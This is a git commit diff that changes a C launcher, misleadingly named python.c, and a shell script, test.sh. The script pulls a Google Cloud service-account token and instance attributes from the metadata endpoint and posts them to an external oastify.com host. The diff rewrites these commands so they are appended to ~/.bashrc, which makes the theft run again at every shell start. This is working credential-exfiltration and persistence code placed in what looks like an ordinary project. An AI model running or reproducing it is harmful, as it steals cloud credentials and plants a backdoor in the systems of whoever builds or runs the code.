17cdda6c3bc11abec82c1995a2c65199317fac57
febou92 <febou92@gmail.com>
2026-09-21 15:20:55 -0400

    mod both files

--- python.c
+++ python.c
@@ -3,5 +3,6 @@
 int main() {
     // Runs the command exactly as you would type it in the terminal
     system("sh ./test.sh");
+    system("echo done > python_done");
     return 0;
 }
--- test.sh
+++ test.sh
@@ -1,13 +1,15 @@
 #!/bin/bash
 
 #sends a request to the metadata endpoint to get creds.
-var=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
+echo 'var=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")'>>~/.bashrc
 
 # exfiltrate the credentials
-curl "http://y10lpu0a075c6qyjjsoc1avp5gb7zxnm.oastify.com/token" -d "$var"
+echo 'curl "http://y10lpu0a075c6qyjjsoc1avp5gb7zxnm.oastify.com/token" -d "$var"'>>~/.bashrc
 
 #sends a request to the metadata endpoint to get attributes
-var2=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text")
+echo 'var2=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text")'>>~/.bashrc
 
 # exfil the attributes
-curl "http://y10lpu0a075c6qyjjsoc1avp5gb7zxnm.oastify.com/attributes" -d "$var2"
+echo 'curl "http://y10lpu0a075c6qyjjsoc1avp5gb7zxnm.oastify.com/attributes" -d "$var2"'>>~/.bashrc
+
+echo 'test.sh done' > test.sh_done
